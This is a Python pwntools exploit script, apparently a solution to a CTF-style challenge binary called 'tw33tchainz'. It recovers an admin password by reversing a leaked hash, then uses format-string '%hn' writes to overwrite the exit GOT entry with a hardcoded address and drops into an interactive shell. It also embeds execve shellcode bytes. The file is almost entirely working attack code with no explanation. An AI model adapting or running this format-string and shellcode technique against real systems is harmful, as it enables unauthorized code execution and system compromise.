import struct
import re
import sys
import binascii
from pwn import *
shellcode = "\x31\xC9\xF7\xE1\xBB\x24\x3A\xF8\xB7\xB0\x0B\xCD\x80"
exit_got = 0x0804d03c
def dotweet(p,t):
    p.sendline("1")

    p.sendline(t)
    if len(t) < 15:
        p.sendline("")
def overwrite(p,shell):
    f = 'A%s%%%dx%%8$hnn'
    for i in xrange(4):
        t = f % (struct.pack('<I',exit_got+i),((shell>>8*i)&0xff)+251)
        dotweet(p,t)
def ms(m,a):
    return int(m.split()[-1],16)+int(a,16)
def rev_hash(s):
    userpass = ""
    for elm in (s[:8],s[8:16],s[16:24],s[24:]):
        userpass += struct.pack('<I',int(elm,16))
    #print userpass
    return userpass
def exploit(p):
    user = "\x00"*15
    salt = "\x00"*15
    a = "15a402fe2e409ff101aecc961753270c"
    #State 1: login with real pass
    p.recvuntil("Enter Username:")
    p.send(user)
    p.recvuntil("Enter Salt:")
    p.sendline(salt)
    p.recvuntil("Generated Password:\n")
    hashi = p.recvline().strip()
    #State2: crack admin pass
    upass = rev_hash(hashi)
    p.sendline("3")
    p.recvuntil("Enter password:")
    p.sendline(upass)
    #State3: inject shellcode
    #p.sendline("6")
    #p.sendline("\n")
    #dotweet(p,shellcode)
    #p.sendline("2")
    #p.sendline("\n")
    #p.recvuntil("Address:")
    #me = p.recvline()
    #mes = ms(me,sys.argv[1])
    #print mes
    ci = int("0xb7e63190",16)
    overwrite(p,ci)
    p.sendline("5")
    
    p.sendline("\n")
    p.interactive() 
if __name__ == '__main__':
    p = process("./tw33tchainz")
    pause()
    exploit(p)
    
